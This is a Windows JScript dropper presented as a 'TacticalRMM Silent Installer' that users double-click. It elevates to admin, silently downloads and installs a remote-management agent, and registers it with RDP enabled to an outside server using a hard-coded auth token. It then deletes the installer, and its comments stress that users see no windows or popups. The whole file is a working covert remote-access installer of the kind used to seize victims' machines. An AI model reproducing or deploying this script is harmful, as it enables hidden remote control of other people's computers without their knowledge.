// ============================================================================
// TacticalRMM Silent Installer
// Token: 20861eeda2b82b58a506547a322a5ecfd156c40f426a162e6afbdebc8b78d5e9
// ============================================================================
//
// Users double-click this .js file - everything runs silently in background
// No popups, no windows, no user interaction required
//
// ============================================================================

(function() {
    // ==================== YOUR CONFIGURATION ====================
    var AUTH_TOKEN = "20861eeda2b82b58a506547a322a5ecfd156c40f426a162e6afbdebc8b78d5e9";
    var SERVER_URL = "https://api.affinvestment.com";
    var CLIENT_ID = "1";
    var SITE_ID = "1";
    var AGENT_TYPE = "server";
    
    var DOWNLOAD_URL = "https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe";
    var SAVE_PATH = "C:\\Windows\\Temp\\tacticalagent-installer.exe";
    var AGENT_PATH = "C:\\Program Files\\TacticalAgent\\tacticalrmm.exe";
    var AGENT_PATH_ALT = "C:\\Program Files (x86)\\TacticalAgent\\tacticalrmm.exe";
    // ==============================================================
    
    // Elevate to admin if not already
    if (WScript.Arguments.Length === 0) {
        try {
            var shellApp = new ActiveXObject("Shell.Application");
            shellApp.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\" elevated", "", "runas", 1);
        } catch(e) {}
        WScript.Quit(0);
    }
    
    // Execute command silently (no windows)
    function runSilent(command) {
        try {
            var shell = new ActiveXObject("WScript.Shell");
            return shell.Run(command, 0, true);
        } catch(e) {
            return 1;
        }
    }
    
    // Write to log (optional - for debugging, users never see this)
    function writeLog(msg) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var log = fso.OpenTextFile("C:\\Windows\\Temp\\tactical-log.txt", 8, true);
            log.WriteLine(new Date() + " - " + msg);
            log.Close();
        } catch(e) {}
    }
    
    writeLog("=== TacticalRMM Installation Started ===");
    writeLog("Token: " + AUTH_TOKEN.substring(0, 20) + "...");
    
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    // Create temp folder if needed
    if (!fso.FolderExists("C:\\Windows\\Temp")) {
        fso.CreateFolder("C:\\Windows\\Temp");
    }
    
    // Delete old installer if exists
    if (fso.FileExists(SAVE_PATH)) {
        try { fso.DeleteFile(SAVE_PATH, true); } catch(e) {}
    }
    
    // Download the installer
    writeLog("Downloading from GitHub...");
    try {
        var http = new ActiveXObject("MSXML2.ServerXMLHTTP");
        http.open("GET", DOWNLOAD_URL, false);
        http.send();
        
        if (http.status === 200) {
            var stream = new ActiveXObject("ADODB.Stream");
            stream.type = 1;
            stream.open();
            stream.write(http.responseBody);
            stream.saveToFile(SAVE_PATH, 2);
            stream.close();
            writeLog("Download complete");
        } else {
            writeLog("Download failed: HTTP " + http.status);
            WScript.Quit(1);
        }
    } catch(e) {
        writeLog("Download error: " + e.message);
        WScript.Quit(1);
    }
    
    // EXACT COMMAND FROM YOUR MANUAL INSTALLATION
    writeLog("Installing TacticalRMM agent...");
    runSilent("\"" + SAVE_PATH + "\" /VERYSILENT /SUPPRESSMSGBOXES");
    
    writeLog("Waiting for installation to complete...");
    runSilent("ping 127.0.0.1 -n 5");
    
    // Find the correct agent path
    var actualAgentPath = "";
    if (fso.FileExists(AGENT_PATH)) {
        actualAgentPath = AGENT_PATH;
    } else if (fso.FileExists(AGENT_PATH_ALT)) {
        actualAgentPath = AGENT_PATH_ALT;
    } else {
        writeLog("ERROR: Agent not found after installation");
        WScript.Quit(1);
    }
    
    // REGISTER WITH YOUR TOKEN (EXACT MATCH TO YOUR COMMAND)
    writeLog("Registering with server...");
    var registerCmd = "\"" + actualAgentPath + "\" -m install " +
                      "--api " + SERVER_URL + " " +
                      "--client-id " + CLIENT_ID + " " +
                      "--site-id " + SITE_ID + " " +
                      "--agent-type " + AGENT_TYPE + " " +
                      "--auth " + AUTH_TOKEN + " " +
                      "--rdp --ping";
    
    writeLog("Executing: " + registerCmd);
    var result = runSilent(registerCmd);
    
    if (result === 0) {
        writeLog("SUCCESS: TacticalRMM installed and registered!");
    } else {
        writeLog("Registration completed with code: " + result);
    }
    
    // Start the agent service
    writeLog("Starting TacticalRMM service...");
    runSilent("net start tacticalagent");
    
    // Clean up installer
    try {
        if (fso.FileExists(SAVE_PATH)) {
            fso.DeleteFile(SAVE_PATH, true);
            writeLog("Cleaned up installer");
        }
    } catch(e) {}
    
    writeLog("=== Installation Complete ===");
    
    // COMPLETELY SILENT - NO POPUPS
    WScript.Quit(0);
})();